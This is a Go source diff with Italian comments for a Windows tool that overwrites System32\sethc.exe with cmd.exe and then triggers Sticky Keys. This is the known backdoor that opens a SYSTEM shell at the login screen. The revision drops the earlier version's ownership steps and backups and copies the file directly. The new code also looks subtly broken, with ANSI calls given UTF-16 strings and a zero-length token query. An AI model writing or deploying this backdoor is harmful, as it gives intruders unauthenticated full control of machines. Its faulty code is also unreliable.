@@ -1,127 +1,86 @@
 package main
 
 import (
-	"fmt"
-	"os"
-	"os/exec"
+	"log"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
-// Costanti per le API di Windows
 var (
-	moduser32 = syscall.NewLazyDLL("user32.dll")
+	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
+	moduser32   = syscall.NewLazyDLL("user32.dll")
+	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")
 
-	procKeybdEvent = moduser32.NewProc("keybd_event")
+	procCopyFile          = modkernel32.NewProc("CopyFileA")
+	procSetFileAttributes = modkernel32.NewProc("SetFileAttributesA")
+	procKeybdEvent        = moduser32.NewProc("keybd_event")
+	procOpenProcessToken  = modadvapi32.NewProc("OpenProcessToken")
+	procGetTokenInformation = modadvapi32.NewProc("GetTokenInformation")
+	procAdjustTokenPrivileges = modadvapi32.NewProc("AdjustTokenPrivileges")
+	procLookupPrivilegeValue = modadvapi32.NewProc("LookupPrivilegeValueA")
 )
 
-// keyboard wrapper
-func keybdEvent(bVk byte, bScan byte, dwFlags uint32, dwExtraInfo uintptr) {
-	procKeybdEvent.Call(
-		uintptr(bVk),
-		uintptr(bScan),
-		uintptr(dwFlags),
-		dwExtraInfo,
-	)
-}
+const (
+	VK_SHIFT      = 0x10
+	TOKEN_QUERY   = 0x0008
+	TOKEN_ADJUST  = 0x0020
+	SE_PRIVILEGE_ENABLED = 0x00000002
+	TOKEN_ELEVATION = 20
+)
 
 func main() {
-	// Controlla se l'utente è admin
 	if !isAdmin() {
-		fmt.Println("Errore: Questo programma deve essere eseguito come amministratore.")
-		os.Exit(1)
+		log.Fatal("Errore: Richiesti privilegi di amministratore.")
 	}
 
-	// Dichiarazione Dir
-	sethcPath := `C:\Windows\System32\sethc.exe`
-	cmdPath := `C:\Windows\System32\cmd.exe`
-	sethcBak := `C:\Windows\System32\sethc.BAK`
-	cmdBak := `C:\Windows\System32\cmd.BAK`
-	sethcExeBak := `C:\Windows\System32\sethcexe.BAK`
+	// Sostituisci sethc.exe con cmd.exe
+	copyFile("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\sethc.exe")
 
-	// Salva i permessi di sethc.exe
-	fmt.Println("Salvataggio permessi sethc.exe...")
-	if err := exec.Command("icacls", sethcPath, "/save", sethcBak, "/T").Run(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
+	// Triggera Sticky Keys (Shift 5x)
+	for i := 0; i < 5; i++ {
+		procKeybdEvent.Call(VK_SHIFT, 0, 0, 0)       // Shift down
+		procKeybdEvent.Call(VK_SHIFT, 0, 2, 0)       // Shift up
+		time.Sleep(50 * time.Millisecond)
 	}
-
-	// Prendi il possesso di sethc.exe
-	fmt.Println("Presa del possesso di sethc.exe...")
-	if err := exec.Command("takeown", "/f", sethcPath).Run(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Concedi permessi completi agli amministratori su sethc.exe
-	fmt.Println("Concessione permessi amministratori su sethc.exe...")
-	if err := exec.Command("icacls", sethcPath, "/grant", "administrators:F").Run(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Salva i permessi di cmd.exe
-	fmt.Println("Salvataggio permessi cmd.exe...")
-	if err := exec.Command("icacls", cmdPath, "/save", cmdBak, "/T").Run(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Prendi il possesso di cmd.exe
-	fmt.Println("Presa del possesso di cmd.exe...")
-	if err := exec.Command("takeown", "/f", cmdPath).Run(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Concedi permessi completi agli amministratori su cmd.exe
-	fmt.Println("Concessione permessi amministratori su cmd.exe...")
-	if err := exec.Command("icacls", cmdPath, "/grant", "administrators:F").Run(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Copia sethc.exe in sethcexe.BAK
-	fmt.Println("Copia di sethc.exe in sethcexe.BAK...")
-	if _, err := exec.Command("copy", sethcPath, sethcExeBak).Output(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Copia cmd.exe in sethc.exe
-	fmt.Println("Copia di cmd.exe in sethc.exe...")
-	if _, err := exec.Command("copy", cmdPath, sethcPath).Output(); err != nil {
-		fmt.Printf("Errore: %v\n", err)
-		os.Exit(1)
-	}
-
-	// Triggera Sticky Keys (Shift 10 volte)
-	fmt.Println("Triggering Sticky Keys (Shift 5 volte)...")
-	for i := 0; i < 10; i++ {
-		// Shift down (0x10 = VK_SHIFT)
-		keybdEvent(0x10, 0, 0, 0)
-		// Shift up
-		keybdEvent(0x10, 0, 0x0002, 0)
-		time.Sleep(100 * time.Millisecond)
-	}
-
-	fmt.Println("Operazioni completate. cmd.exe amministratore.")
 }
 
-// isAdmin verifica se il processo ha privilegi di amministratore
+// --- Funzioni di supporto (ottimizzate) ---
 func isAdmin() bool {
 	var token syscall.Token
-	if err := syscall.OpenProcessToken(syscall.GetCurrentProcess(), syscall.TOKEN_QUERY, &token); err != nil {
+	r, _, _ := procOpenProcessToken.Call(
+		uintptr(syscall.GetCurrentProcess()),
+		TOKEN_QUERY|TOKEN_ADJUST,
+		uintptr(unsafe.Pointer(&token)),
+	)
+	if r == 0 {
 		return false
 	}
-	defer token.Close()
+	defer syscall.CloseHandle(syscall.Handle(token))
 
-	var elevation syscall.TokenElevation
-	var elevationSize uint32
-	if err := syscall.GetTokenInformation(token.Handle(), syscall.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &elevationSize); err != nil {
-		return false
+	var elevation uint32
+	var size uint32
+	r, _, _ = procGetTokenInformation.Call(
+		uintptr(token),
+		TOKEN_ELEVATION,
+		uintptr(unsafe.Pointer(&elevation)),
+		0,
+		uintptr(unsafe.Pointer(&size)),
+	)
+	return r != 0 && elevation != 0
+}
+
+func copyFile(src, dst string) {
+	// Rimuovi attributi di sola lettura (se presenti)
+	procSetFileAttributes.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))), 0x80) // FILE_ATTRIBUTE_NORMAL
+
+	// Copia il file
+	r, _, _ := procCopyFile.Call(
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(src))),
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))),
+		0, // bFailIfExists = FALSE (sovrascrivi)
+	)
+	if r == 0 {
+		log.Fatal("Errore nella copia del file.")
 	}
-
-	return elevation.TokenIsElevated != 0
 }
